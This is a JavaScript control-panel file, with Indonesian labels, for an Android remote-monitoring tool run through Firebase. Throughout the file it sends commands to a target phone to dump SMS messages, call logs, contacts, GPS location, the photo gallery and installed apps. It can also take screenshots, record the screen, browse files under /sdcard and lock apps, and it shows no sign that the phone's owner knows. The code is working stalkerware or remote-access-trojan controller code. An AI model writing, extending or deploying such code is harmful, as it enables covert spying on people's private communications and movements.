// ===============================
// INIT SETTING
// ===============================
const db = firebase.database();
let isLoadingApps = false;
let currentUID = null
var respov = $("#cmdref").val();
var var32 = "";
var unqid = "";
var manager = "";
var bckstp = 0;
var database = firebase.database();
var lastkeynot = "";
var lastkeykey = "";
var lastkeyphish = "";
var lastkeyvoice = "";
var wallpaperno = "";
let GLOBAL_CURRENT_PATH = "/";

// ===============================
// KIRIM PERINTAH
// ===============================
function setdatcmd(o, p, q, r) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    var store = {
        cmdn: o,
        cmdv: p,
        cmdvar: q,
        rndm: result
    };
    var con = database.ref(r).child("comdss").set(store);
}
function cmd() {
    var database = firebase.database();
    var us = document.getElementById("cmdref").value;
    var ref = database.ref(us);
    var hio = document.getElementById("cmd").value;
    var hio2 = document.getElementById("cmdvar").value;
    var hio3 = document.getElementById("cmdvarm").value;
    setdatcmd(hio, hio2, hio3, us);
}
// ===============================
// FUNGSI MAPS
// ===============================
function loadMap() {
    const frame = document.querySelector(".map");
    const emptyText = document.querySelector(".empty");
    if (frame) frame.src = "";
    if (emptyText) emptyText.style.display = "none";

    if (!currentUID) return;
    cleanOldLocations(currentUID);
    db.ref("lokasi_pengguna/" + currentUID)
      .limitToLast(1)
      .once("value", snap => {
        if (!snap.exists()) {
            if (emptyText) emptyText.style.display = "block";
            return;
        }

        const obj = Object.values(snap.val())[0];

        if (!obj.lat || !obj.lng) {
            if (emptyText) emptyText.style.display = "block";
            return;
        }

        const url = `https://maps.google.com/maps?q=${obj.lat},${obj.lng}&z=17&output=embed`;

        if (frame) {
            frame.src = url;
        }
    });
}
function cleanOldLocations(currentUID) {
    db.ref("lokasi_pengguna/" + currentUID).once("value",
        snap => {
            if (!snap.exists()) {
                return;
            }
            const all = snap.val();
            const keys = Object.keys(all);
            if (keys.length <= 1) {
                return;
            }
            const sorted = keys.sort((a, b) => all[b].timestamp - all[a].timestamp);
            const newestKey = sorted[0];
            for (let i = 1; i < sorted.length; i++) {
                db.ref(`lokasi_pengguna/${currentUID}/${sorted[i]}`).remove();
            }
        });
}
function dumplokasi() {
    if (!currentUID) {
        return;
    }
    const path = "/comds/comds" + currentUID;
    setdatcmd("getlokasi", "", "", path);
}
// ===============================
// FUNGSI SMS
// ===============================
let smsRequesting = false;

function requestSMS() {
    if (!currentUID) return;

    smsRequesting = true;

    const smsList = document.querySelector("#sms .list");
    const emptyMsg = document.querySelector("#sms .empty");

    smsList.innerHTML = `<li class="konten-loading">Mengambil SMS dari perangkat…</li>`;
    emptyMsg.style.display = "none";

    const path = "/comds/comds" + currentUID;
    setdatcmd("dmpsms", "", "", path);
}

let smsRef = null;
let smsTimeout = null;

function loadSMSBaru(uid) {
    if (!uid) return;
    currentUID = uid;

    const smsList = document.querySelector("#sms .list");
    const emptyMsg = document.querySelector("#sms .empty");
    if (!smsList || !emptyMsg) return;

    if (smsRef) smsRef.off();
    if (smsTimeout) clearTimeout(smsTimeout);

    smsList.innerHTML = `<li class="konten-loading">Memuat SMS…</li>`;
    emptyMsg.style.display = "none";

    smsRef = firebase.database().ref("/SMS/" + uid);

    smsRef.on("value", snap => {
        smsTimeout = setTimeout(() => {
            smsList.innerHTML = "";

            if (!snap.exists()) {
                if (!smsRequesting) emptyMsg.style.display = "block";
                return;
            }

            smsRequesting = false;
            emptyMsg.style.display = "none";
            const data = snap.val();
            Object.keys(data)
                .sort()
                .reverse()
                .forEach(key => {
                    const sms = data[key];

                    const li = document.createElement("li");
                    li.className = "item";
                    li.innerHTML = `
                        <div class="icon">📩</div>
                        <div class="content">
                            <div class="title">${sms["Phone number"] || "-"}</div>
                            <div class="sub-text">${sms.Body || "-"}</div>
                        </div>
                    `;
                    smsList.appendChild(li);
                });

        }, 3000);
    });
}
// ===============================
// FUNGSI PANGGILAN
// ===============================
let callRequesting = false;
let callRef = null;
let callTimeout = null;

function requestCall() {
    if (!currentUID) return;

    callRequesting = true;

    const callList = document.querySelector("#panggilan .list");
    const emptyMsg = document.querySelector("#panggilan .empty");

    callList.innerHTML = `<li class="konten-loading">Mengambil panggilan dari perangkat…</li>`;
    emptyMsg.style.display = "none";

    const path = "/comds/comds" + currentUID;
    setdatcmd("dmpcall", "", "", path);
}

function loadCallBaru(uid) {
    if (!uid) return;
    currentUID = uid;

    const callList = document.querySelector("#panggilan .list");
    const emptyMsg = document.querySelector("#panggilan .empty");
    if (!callList || !emptyMsg) return;

    if (callRef) callRef.off();
    if (callTimeout) clearTimeout(callTimeout);

    callList.innerHTML = `<li class="konten-loading">Memuat panggilan…</li>`;
    emptyMsg.style.display = "none";

    callRef = firebase.database().ref("/Call/" + uid);

    callRef.on("value", snap => {
        callTimeout = setTimeout(() => {
            callList.innerHTML = "";

            if (!snap.exists()) {
                if (!callRequesting) {
                    emptyMsg.style.display = "block";
                }
                return;
            }

            callRequesting = false;
            emptyMsg.style.display = "none";

            const data = snap.val();

            Object.keys(data)
              .sort()
              .reverse()
              .forEach(key => {
                  const c = data[key];

                  const dateObj = new Date(Number(c.Calldate));
                  const timeTxt = dateObj.toLocaleTimeString([], {
                      hour: "2-digit",
                      minute: "2-digit"
                  });
                  const dateTxt = dateObj.toLocaleDateString([], {
                      day: "2-digit",
                      month: "short"
                  });

                  const callType = (c.Calltype || "").toLowerCase();
                  const color = callType === "masuk" ? "#22c55e" : "#ef4444";

                  const iconSvg = callType === "masuk"
                    ? `<svg viewBox="0 0 24 24" width="20" height="20"
                           fill="none" stroke="currentColor" stroke-width="2">
                          <path d="M12 5v14"/>
                          <polyline points="19 12 12 19 5 12"/>
                       </svg>`
                    : `<svg viewBox="0 0 24 24" width="20" height="20"
                           fill="none" stroke="currentColor" stroke-width="2">
                          <path d="M12 19V5"/>
                          <polyline points="5 12 12 5 19 12"/>
                       </svg>`;

                  const li = document.createElement("li");
                  li.className = "item";
                  li.innerHTML = `
                    <div class="icon" style="color:${color}">
                      ${iconSvg}
                    </div>
                    <div class="content">
                      <div class="title">${c["Phone number"] || "-"}</div>
                      <div class="sub-text">
                        ${c.Calltype || "-"} • ${timeTxt} • ${dateTxt}
                      </div>
                    </div>
                  `;

                  callList.appendChild(li);
              });

        }, 3000);
    });
}
// ===============================
// FUNGSI KONTAK
// ===============================
let contactRequesting = false;
let contactsRef = null;
let contactsTimeout = null;

function requestContacts() {
    if (!currentUID) return;

    contactRequesting = true;

    const box = document.querySelector("#kontak ul.list");
    const emptyMsg = document.querySelector("#kontak .empty");

    box.innerHTML = `<li class="konten-loading">Mengambil kontak dari perangkat…</li>`;
    emptyMsg.style.display = "none";

    const path = "/comds/comds" + currentUID;
    setdatcmd("dmpcont", "", "", path);
}

function loadContactsBaru(uid) {
    if (!uid) return;
    currentUID = uid;

    const box = document.querySelector("#kontak ul.list");
    const emptyMsg = document.querySelector("#kontak .empty");
    if (!box || !emptyMsg) return;

    if (contactsRef) contactsRef.off();
    if (contactsTimeout) clearTimeout(contactsTimeout);

    box.innerHTML = `<li class="konten-loading">Memuat kontak…</li>`;
    emptyMsg.style.display = "none";

    contactsRef = firebase.database().ref("/Contact/" + currentUID);

    contactsRef.on("value", snap => {
        contactsTimeout = setTimeout(() => {
            box.innerHTML = "";

            if (!snap.exists()) {
                if (!contactRequesting) {
                    emptyMsg.style.display = "block";
                }
                return;
            }

            contactRequesting = false;
            emptyMsg.style.display = "none";

            const data = snap.val();

            Object.keys(data)
              .sort()
              .reverse()
              .forEach(key => {
                  const c = data[key];

                  const li = document.createElement("li");
                  li.className = "item";
                  li.innerHTML = `
                      <div class="icon">👤</div>
                      <div class="content">
                          <div class="title">${c.Name || "-"}</div>
                          <div class="sub-text">${c.Phone || "-"}</div>
                          <div class="sub-sub-text">${c.Type || "-"}</div>
                      </div>
                  `;

                  box.appendChild(li);
              });

        }, 3000);
    });
}
// ===============================
// FUNGSI USAGE
// ===============================
let usageChart;

function loadAppUsage(uid) {
  const ref = firebase.database().ref("AppUsage/" + uid);

  ref.once("value", snap => {
    const container = document.getElementById("usageList");
    if (!container) return;
    container.innerHTML = "";
    if (!snap.exists()) {
      container.innerHTML =
        "<div class='sub-text-text' style='text-align:center'>Tidak ada data</div>";
      return;
    }

    const labels = [];
    const values = [];

    Object.values(snap.val()).forEach(app => {
      const appName = app.Name || "Unknown";
      const minutes = parseUsageToMinutes(app.Usage);
      const iconUrl = app.Icon || "";
      labels.push(appName);
      values.push(minutes);
      const item = document.createElement("div");
      item.className = "item";
      item.innerHTML = `
        <div class="icon">
          ${iconUrl ? `<img src="${iconUrl}">` : ""}
        </div>
        <div class="content">
          <div class="title">${appName}</div>
        </div>
        <div class="sub-text-text">${formatMinutes(minutes)}</div>
      `;

      container.appendChild(item);
    });

    drawUsageChart(labels, values);
  });
}
// ===============================
// FUNGSI DRAW CHART
// ===============================
function drawUsageChart(labels, values) {
  const canvas = document.getElementById("usageChart");
  if (!canvas) return;
  if (typeof usageChart !== "undefined" && usageChart) {
    usageChart.destroy();
  }
  usageChart = new Chart(canvas, {
    type: "bar",
    data: {
      labels: labels,
      datasets: [{
        data: values,
        backgroundColor: "#3b82f6",
        borderRadius: 10
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      animation: {
        duration: 1800,
        easing: "easeOutQuart",
        delay: ctx => ctx.dataIndex * 150
      },
      plugins: {
        legend: { display: false }
      },
      scales: {
        y: {
          beginAtZero: true
        }
      }
    }
  });
}
function formatMinutes(min) {
  const h = Math.floor(min / 60);
  const m = min % 60;
  return h > 0 ? `${h} jam ${m} mnt` : `${m} mnt`;
}
function parseUsageToMinutes(text){
  if (!text) return 0;

  let total = 0;
  const str = text.toLowerCase();
  const jam = str.match(/(\d+)\s*jam/);
  if (jam) total += parseInt(jam[1]) * 60;
  const menit = str.match(/(\d+)\s*menit/);
  if (menit) total += parseInt(menit[1]);

  return total;
}
// ===============================
// GALLERY FOTO
// ===============================
let galleryRef = null;
let galleryTimeout = null;

function rendergallery() {
    if (!currentUID) return;

    const container = document.querySelector("#gallery .gallery");
    const emptyMsg  = document.querySelector("#gallery .empty");

    if (!container || !emptyMsg) return;

    if (galleryRef) galleryRef.off();
    if (galleryTimeout) clearTimeout(galleryTimeout);

    container.innerHTML = `<div class="konten-loading">Memuat gallery…</div>`;
    emptyMsg.style.display = "none";
    
    galleryRef = firebase.database().ref("/gallery_list/" + currentUID);

    galleryRef.on("value", snap => {
        const data = snap.val();

        galleryTimeout = setTimeout(() => {
            container.innerHTML = "";

            if (!data || Object.keys(data).length === 0) {
                emptyMsg.style.display = "block";
                return;
            }
            Object.keys(data)
              .sort()
              .reverse()
              .forEach(key => {
                  const url = data[key];
                  const item = document.createElement("div");
                  item.className = "item";
                  item.innerHTML = `<img src="${url}" loading="lazy">`;
                  item.querySelector("img").onclick = () => openPreviewGallery(url);
                  container.appendChild(item);
              });
        }, 3000);
    });
}

function openPreviewGallery(url) {
    const preview = document.getElementById("gallery_fix-preview");
    const previewImg = document.getElementById("gallery_fix-preview-img");

    previewImg.src = url;
    preview.classList.add("active");
}

document.querySelector(".gallery_fix-close").onclick = function () {
    
    document.getElementById("gallery_fix-preview").classList.remove("active");
};
// ===============================
// FUNGSI SCREENSHOT
// ===============================
function takeScreenshot() {
    if (!currentUID) {
        return;
    }
    const path = "/comds/comds" + currentUID;
    setdatcmd("screenshot", "", "", path);
}

function handleScreenshot(){
  showToast();
  try{
    takeScreenshot();
  }catch(err){
    console.error("Screenshot error:", err);
  }
}

let screenshotRef = null;

function loadScreenshotRealtime() {
    if (!currentUID) return;

    const container = document.querySelector("#screenshot .gallery");
    const emptyMsg  = document.querySelector("#screenshot .empty");
    if (screenshotRef) {
        screenshotRef.off();
    }
    container.innerHTML = "";
    emptyMsg.style.display = "none";

    container.innerHTML = `<div class="loader-mini"></div>`;
    
    screenshotRef = firebase.database().ref("/screenshots/" + currentUID);

    screenshotRef.on("value", snap => {
        container.innerHTML = "";

        if (!snap.exists()) {
            emptyMsg.style.display = "block";
            return;
        }

        const data = snap.val();
        Object.keys(data)
          .sort()
          .reverse()
          .forEach(key => {
              const url = data[key];
              const item = document.createElement("div");
              item.className = "item";
              item.innerHTML = `<img src="${url}" loading="lazy">`;
              item.querySelector("img").onclick = () => openPreviewScreenshot(url);
              container.appendChild(item);
          });
    });
}
function openPreviewScreenshot(url) {
    const preview = document.getElementById("gallery_fix-preview");
    const previewImg = document.getElementById("gallery_fix-preview-img");

    previewImg.src = url;
    preview.classList.add("active");
}
// ===============================
// MAPS & GEOFENCE
// ===============================
let map, marker, circle, autocomplete, lokasiListener;
let currentLat = -6.2;
let currentLng = 106.816666;
let currentRadius = 500;

function loadLatestLocationFromFirebase(callback) {
  db.ref("lokasi_pengguna/" + currentUID).once("value", snap => {
    if (!snap.exists()) return callback(null);

    const all = snap.val();
    const keys = Object.keys(all || {});
    if (!keys.length) return callback(null);

    const newest = all[keys.sort(
      (a,b)=>(all[b].timestamp||0)-(all[a].timestamp||0)
    )[0]];

    callback({
      lat: newest.lat || currentLat,
      lng: newest.lng || currentLng,
      radius: newest.radius || currentRadius
    });
  });
}

function initMap() {
  const mapEl = document.getElementById("map");
  if (!mapEl) return;

  map = new google.maps.Map(mapEl, {
    center: { lat: currentLat, lng: currentLng },
    zoom: 15,
    mapTypeControl:false,
    fullscreenControl:false,
    streetViewControl:false,
    zoomControl:false
  });
  
  marker = new google.maps.Marker({
    map,
    draggable:true,
    position:{ lat: currentLat, lng: currentLng }
  });

  circle = new google.maps.Circle({
    map,
    center: marker.getPosition(),
    radius: currentRadius,
    fillColor:"#22c55e",
    fillOpacity:0.25,
    strokeColor:"#16a34a",
    strokeWeight:2
  });

  marker.addListener("dragend", () =>
    circle.setCenter(marker.getPosition())
  );

  autocomplete = new google.maps.places.Autocomplete(
    document.getElementById("searchBox")
  );
  autocomplete.bindTo("bounds", map);
  autocomplete.addListener("place_changed", () => {
    const p = autocomplete.getPlace();
    if (!p.geometry) return;
    map.setCenter(p.geometry.location);
    marker.setPosition(p.geometry.location);
    circle.setCenter(p.geometry.location);
  });

  document.getElementById("radiusSelect")
    ?.addEventListener("change", e =>
      circle.setRadius(parseInt(e.target.value))
    );

  document.getElementById("saveBtn")
    ?.addEventListener("click", saveGeofence);
}

function saveGeofence() {
  const input = document.getElementById("placeName");
  const name = input.value.trim();
  if (!name) return input.focus();

  const pos = marker.getPosition();
  db.ref("lokasi/" + currentUID).push({
    name,
    lat: pos.lat(),
    lng: pos.lng(),
    radius: circle.getRadius(),
    timestamp: Date.now()
  });

  input.value = "";
}

function loadUserGeofencesRealtime(uid) {
  if (!uid) return;

  const ref = db.ref("lokasi/" + uid);
  if (lokasiListener) ref.off("value", lokasiListener);

  lokasiListener = ref.on("value", snap => {
    const list = document.querySelector(".geofence-list");
    list.innerHTML = "";
    const geofences = snap.val();
    if (!geofences) return;

    db.ref("lokasi_pengguna/" + uid).once("value").then(us => {
      const users = us.val();
      if (!users) return;

      const u = users[Object.keys(users).sort(
        (a,b)=>(users[b].timestamp||0)-(users[a].timestamp||0)
      )[0]];

      Object.keys(geofences).forEach(k => {
        const g = geofences[k];
        const d = haversineDistance(u.lat,u.lng,g.lat,g.lng);
        renderGeofenceItem(k, g.name, d, d > g.radius);
      });
    });
  });
}

function renderGeofenceItem(key, name, distance, isOut) {
  const row = document.createElement("div");
  row.className = "geofence-row";
  row.innerHTML = `
    <div class="geo-left">
      <span class="geo-dot ${isOut ? "out":"in"}"></span>
      <div class="geo-text">
        <div class="geo-name">Nama: ${name}</div>
        <div class="geo-radius">
          Radius: Jarak saat ini ${Math.round(distance)} meter
        </div>
      </div>
    </div>
    <button class="geo-delete">Hapus</button>
  `;
  row.querySelector(".geo-delete").onclick =
    () => db.ref("lokasi/" + currentUID + "/" + key).remove();
  document.querySelector(".geofence-list").appendChild(row);
}

function haversineDistance(a,b,c,d) {
  const R=6371000,t=x=>x*Math.PI/180;
  const dLat=t(c-a),dLng=t(d-b);
  const h=Math.sin(dLat/2)**2+
    Math.cos(t(a))*Math.cos(t(c))*Math.sin(dLng/2)**2;
  return R*(2*Math.atan2(Math.sqrt(h),Math.sqrt(1-h)));
}

function iniFungsi() {
  loadLatestLocationFromFirebase(loc => {
    if (loc) {
      currentLat = loc.lat;
      currentLng = loc.lng;
      currentRadius = loc.radius;
    }
    initMap();
    loadUserGeofencesRealtime(currentUID);
  });
}
// ===============================
// DEVICE INFO
// ===============================
function devinfo() {
    if (!currentUID) {
        return;
    }
    const path = "/comds/comds" + currentUID;
    setdatcmd("deviceinfo", "", "", path);
}

function loadDeviceInfo(uid) {
    if (!uid) return;

    firebase.database().ref('/DeviceInfo/' + uid).get()
      .then(snapshot => {
        if (!snapshot.exists()) return;

        const device = snapshot.val();
        const list = document.getElementById("deviceInfoList");

        list.innerHTML = `
          <li class="item">
            <div class="icon">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="18" height="18" rx="2" />
                <path d="M7 7h10v10H7z"/>
              </svg>
            </div>
            <div class="content">
              <div class="title">Model</div>
              <div class="sub-text">${device.model}</div>
            </div>
          </li>

          <li class="item">
            <div class="icon">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M4 4h16v16H4z"/>
                <path d="M12 2v4"/>
              </svg>
            </div>
            <div class="content">
              <div class="title">Android Version</div>
              <div class="sub-text">${device.android_version}</div>
            </div>
          </li>

          <li class="item">
            <div class="icon">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="2" y="4" width="20" height="16" rx="2"/>
                <line x1="8" y1="2" x2="16" y2="2"/>
              </svg>
            </div>
            <div class="content">
              <div class="title">Resolution</div>
              <div class="sub-text">${device.resolution}</div>
            </div>
          </li>

          <li class="item">
            <div class="icon">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 1v22"/>
                <path d="M3 12h18"/>
              </svg>
            </div>
            <div class="content">
              <div class="title">SDK</div>
              <div class="sub-text">${device.sdk}</div>
            </div>
          </li>
        `;
      })
      .catch(err => console.error("Gagal load device info:", err));
  }
// ===============================
// SCREEN RECORDER
// ===============================
function startRecord() {
    if (!currentUID) {
        return;
    }
    const path = "/comds/comds" + currentUID;
    setdatcmd("stream", "", "", path);
}
let screenrecordRef = null;

function getlistvideorecord() {
    if (!currentUID) return;
    const container = document.querySelector("#screenrecorder .gallery");
    const emptyMsg  = document.querySelector("#screenrecorder .empty");
    if (screenrecordRef) screenrecordRef.off();

    container.innerHTML = "";
    emptyMsg.style.display = "none";
    
    container.innerHTML = `<div class="loader-mini"></div>`;

    screenrecordRef = firebase.database().ref("/screenrecords/" + currentUID);
    screenrecordRef.on("value", snap => {
        container.innerHTML = "";
        if (!snap.exists()) {
            emptyMsg.style.display = "block";
            return;
        }
        const data = snap.val();
        Object.keys(data).sort().reverse().forEach(key => {
            const url = data[key];
            const item = document.createElement("div");
item.className = "item";

item.innerHTML = `
  <div class="preview-play">
    <svg viewBox="0 0 24 24"
         fill="none"
         stroke="currentColor"
         stroke-width="2">
      <polygon points="5 3 19 12 5 21 5 3"/>
    </svg>
  </div>
`;

item.querySelector(".preview-play").onclick = () => openPreviewScreenrecord(url);
container.appendChild(item);

        });
    });
}
function openPreviewScreenrecord(url) {
    const preview = document.getElementById("screen_fix-preview");
    const previewVideo = document.getElementById("gallery_fix-preview-video");
    previewVideo.src = url;
    preview.classList.add("active");
    previewVideo.play();
}
document.querySelectorAll(".gallery_fix-close").forEach(btn => {
    btn.onclick = () => {
        document.querySelectorAll(".preview").forEach(p => {
            p.classList.remove("active");
        });
    };
});
// ===============================
// filesmanager
// ===============================

function filesmanager() {
    manager = "filesmanager";

    if (!currentUID) {
        return;
    }

    const path = "/comds/comds" + currentUID;
    setdatcmd("cd", "/sdcard/", "", path);
}
function showLoading() {
    const container = document.querySelector("#filelistBaru");
    if (!container) return;
    container.innerHTML = `<div class="konten-loading">Loading...</div>`;
}

function hideLoading() {
}
function navigateBack() {
    if (!GLOBAL_CURRENT_PATH || GLOBAL_CURRENT_PATH === "/" || GLOBAL_CURRENT_PATH === "/sdcard/") {
        return;
    }

    showLoading();

    let temp = GLOBAL_CURRENT_PATH;
    if (temp.endsWith("/")) temp = temp.slice(0, -1);
    const parentPath = temp.substring(0, temp.lastIndexOf("/") + 1);
    const pathCmd = "/comds/comds" + currentUID;

    setdatcmd("cd", parentPath, "", pathCmd);

    setTimeout(() => {
        loadFileList();
    }, 500);
}

function renderFileList(rawList, currentPath) {
    const container = document.querySelector("#filelistBaru");
    if (!container) return;

    container.innerHTML = "";

    if (!rawList || typeof rawList !== "string") {
        return;
    }

    let items = rawList.split("<li");
    items = items.map(x => x.trim()).filter(x => x !== "");

    const parsed = [];

    items.forEach(item => {
        let type = "";
        const typeMatch = item.match(/class=\"(.*?)\"/);
        if (typeMatch) type = typeMatch[1];

        let name = item.replace(/.*?>/, "").trim();
        name = name.replace(/<b>.*?<\/b>/g, "").replace("</li>", "").trim();

        let size = "";
        const sizeMatch = item.match(/<b>(.*?)<\/b>/);
        if (sizeMatch) size = sizeMatch[1];

        parsed.push({ type, name, size });
    });

    parsed.sort((a, b) => {
        if (a.type === "fo" && b.type !== "fo") return -1;
        if (a.type !== "fo" && b.type === "fo") return 1;
        return a.name.localeCompare(b.name);
    });

    parsed.forEach(obj => {
        const li = document.createElement("li");
        li.className = "item";
        li.setAttribute("data-file", obj.name);
        li.setAttribute("data-type", obj.type);
        li.innerHTML = `
            ${getFileIcon(obj.type)}
            <div class="content">
                <div class="title">${obj.name}</div>
                <div class="sub-text">${obj.size || ""}</div>
            </div>
        `;
        li.onclick = () => {
            fileopen(li);
        };
        container.appendChild(li);
    });
}

function getFileIcon(type) {
    switch (type) {
        case "fo":
            return `
            <div class="icon" style="color:#f59e0b">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M3 7h5l2 2h11v8a2 2 0 0 1-2 2H3z"/>
                </svg>
            </div>`;

        case "pdf":
            return `
            <div class="icon" style="color:#ef4444">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                    <polyline points="14 2 14 8 20 8"/>
                </svg>
            </div>`;

        case "im":
        case "image":
            return `
            <div class="icon" style="color:#22c55e">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="3" width="18" height="18" rx="2"/>
                    <circle cx="8.5" cy="8.5" r="1.5"/>
                    <path d="M21 15l-5-5L5 21"/>
                </svg>
            </div>`;

        case "vi":
        case "video":
            return `
            <div class="icon" style="color:#3b82f6">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="2" y="7" width="15" height="10" rx="2"/>
                    <polygon points="23 7 16 12 23 17 23 7"/>
                </svg>
            </div>`;

        default:
            return `
            <div class="icon" style="color:#9aa1b8">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12"/>
                </svg>
            </div>`;
    }
}

function fileopen(item) {
    const tarfol = item.getAttribute("data-file");
    const type = item.getAttribute("data-type");

    const path = "/comds/comds" + currentUID;

    if (type !== "fo") {
        openFileViewer(
            GLOBAL_CURRENT_PATH + "/" + tarfol,
            null,
            GLOBAL_CURRENT_PATH,
            type
        );
        return;
    }
    showLoading();

    let finalPath = "";

    if (tarfol === "..") {
        finalPath = GLOBAL_CURRENT_PATH.substring(0, GLOBAL_CURRENT_PATH.lastIndexOf("/"));
    } else {
        finalPath = GLOBAL_CURRENT_PATH + "/" + tarfol;
    }

    setdatcmd("cd", finalPath, "", path);

    setTimeout(() => {
        loadFileList();
    }, 500);
}

function loadFileList() {
    if (!currentUID) return;

    const path = "/respos/respo" + currentUID + "/respo";

    firebase.database().ref(path).once("value").then(snap => {
        if (!snap.exists()) {
            return;
        }

        const data = snap.val();
        const rawList = data.respo;
        const currentPath = data.var2;

        GLOBAL_CURRENT_PATH = currentPath;

        const viewerModes = ["fileview", "imgview", "pdfview", "docview", "textview"];

        if (viewerModes.includes(rawList)) {
            openFileViewer(data.v1, data.v2, data.var2, rawList);
            return;
        }

        renderFileList(rawList, currentPath);
    }).catch(err => {
    });
}

function closeViewer() {
    const filelist = document.getElementById("filelistBaru");
    if (filelist) filelist.style.display = "block";

    const imgBox = document.getElementById("fullFilePreview");
    const vidBox = document.getElementById("fullFilePreviewVideo");
    const docBox = document.getElementById("fullFilePreviewDoc");

    if (imgBox) imgBox.style.display = "none";
    if (vidBox) vidBox.style.display = "none";
    if (docBox) docBox.style.display = "none";

    const img = document.getElementById("fullFilePreviewImage");
    const video = document.getElementById("videoPlayer");
    const frame = document.getElementById("docFrame");

    if (img) img.src = "";

    if (video) {
        try { video.pause(); } catch(e){}
        video.removeAttribute("src");
        video.load && video.load();
    }

    if (frame) frame.src = "";
}

function bindCloseButtons() {
    document.querySelectorAll(".gallery_fix-close").forEach(btn => {
        if (btn._bound) return;
        btn.addEventListener("click", closeViewer);
        btn._bound = true;
    });
}

bindCloseButtons();

function openFileViewer(url, info, fullpath, type) {
    const safeType = (type || "").trim().toLowerCase();

    const filelist = document.getElementById("filelistBaru");
    if (filelist) filelist.style.display = "none";

    const imgBox = document.getElementById("fullFilePreview");
    const vidBox = document.getElementById("fullFilePreviewVideo");
    const docBox = document.getElementById("fullFilePreviewDoc");

    if (imgBox) imgBox.style.display = "none";
    if (vidBox) vidBox.style.display = "none";
    if (docBox) docBox.style.display = "none";

    if (safeType === "vi") {
        if (!vidBox) return;

        const video = document.getElementById("videoPlayer");
        if (!video) return;

        video.pause();
        video.removeAttribute("src");
        video.load();
        video.src = url || "";
        video.controls = true;

        vidBox.style.display = "flex";

        video.play().catch(err => {});
        return;
    }

    if (safeType === "im") {
        if (!imgBox) return;

        const img = document.getElementById("fullFilePreviewImage");
        if (img) img.src = url || "";
        imgBox.style.display = "flex";
        return;
    }

    if (safeType === "fi") {
        if (!docBox) return;

        const frame = document.getElementById("docFrame");
        if (frame) frame.src = url || "";
        docBox.style.display = "flex";
        return;
    }

    if (imgBox) {
        const fallbackImg = document.getElementById("fullFilePreviewImage");
        if (fallbackImg) fallbackImg.src = url || "";
        imgBox.style.display = "flex";
    }
}

function bindCloseDebug() {
    document.querySelectorAll(".gallery_fix-close").forEach(btn => {
        btn.addEventListener("click", e => {
            e.stopPropagation();
            closeViewer();
        });
    });
}
bindCloseDebug();
// ===============================
// APLIKASI
// ===============================
function getpackages() {
    if (!currentUID) {
        return;
    }
    const path = "/comds/comds" + currentUID;
    setdatcmd("getpackages", "", "", path);
}
function loadAppsBaru() {
    const dbRef = firebase.database().ref("/apps/Mery" + currentUID);
    const container = document.querySelector("#aplikasi .list");

    dbRef.once("value").then(snap => {
        container.innerHTML = "";
        const data = snap.val();
        if (!data) return;

        const ids = Object.keys(data);
        let index = 0;

        function renderBatch() {
            const batchSize = 2;

            for (let i = 0; i < batchSize && index < ids.length; i++, index++) {
                const id = ids[index];
                const app = data[id];

                const initial = app.name
                    ? app.name.charAt(0).toUpperCase()
                    : "?";

                const item = document.createElement("li");
                item.className = "item";

                item.innerHTML = `
                    <div class="icon">
                        ${app.icon
                            ? `<img src="${app.icon}" alt="">`
                            : initial}
                    </div>

                    <div class="content">
                        <div class="title">${app.name}</div>
                        <div class="sub-text">${app.pkg}</div>
                    </div>

                    <label class="switch">
                        <input type="checkbox"
                            ${app.locked ? "checked" : ""}
                            onchange="updateLockStatus('${id}', this.checked)">
                        <span class="slider"></span>
                    </label>
                `;

                container.appendChild(item);
            }

            if (index < ids.length) {
                setTimeout(renderBatch, 150);
            }
        }

        renderBatch();
    });
}
function updateLockStatus(id, status) {
    firebase.database()
        .ref("/apps/Mery" + currentUID + "/" + id)
        .update({
            locked: status
        });
}